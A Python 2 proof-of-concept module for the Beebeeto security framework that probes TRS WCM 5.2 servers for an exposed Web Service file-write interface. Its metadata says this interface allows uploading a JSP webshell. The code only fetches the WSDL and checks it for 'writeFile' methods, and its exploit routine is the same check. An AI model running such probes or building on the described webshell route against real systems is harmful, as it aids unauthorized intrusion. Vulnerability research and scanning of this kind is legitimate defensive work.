#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0124',
            'name': 'TRS wcm 5.2 /wcm/services/ 文件上传漏洞 POC',
            'author': '1024',
            'create_date': '2015-07-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'trs',
            'vul_version': ['5.2'],
            'type': 'File Upload',
            'tag': ['TRS WCM 6.X GETSHELL', 'TRS WCM 5.X 漏洞', '文件上传漏洞', 'jsp'],
            'desc': 'TRS WCM的Web Service提供了向服务器写入文件的方式，可以直接写jsp文件获取webshell',
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-092138',
                           'http://www.wooyun.org/bugs/wooyun-2013-034315',],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = '/wcm/services/trs:templateservicefacade?wsdl'
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'writeFile' in req.content and 'writeSpecFile' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())